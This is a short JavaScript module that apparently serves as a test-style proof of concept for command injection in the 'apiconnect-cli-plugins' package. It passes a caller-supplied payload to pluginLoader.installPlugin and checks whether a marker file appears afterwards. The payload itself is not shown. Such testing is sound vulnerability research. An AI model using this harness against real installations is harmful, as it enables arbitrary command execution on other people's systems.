function exploitFunction(payload) {
  const root = require("apiconnect-cli-plugins");
  const fs = require("fs");
  const path = "./apiconnect-cli-plugins";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  return root.pluginLoader.installPlugin(payload, "").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
}

module.exports = { exploitFunction };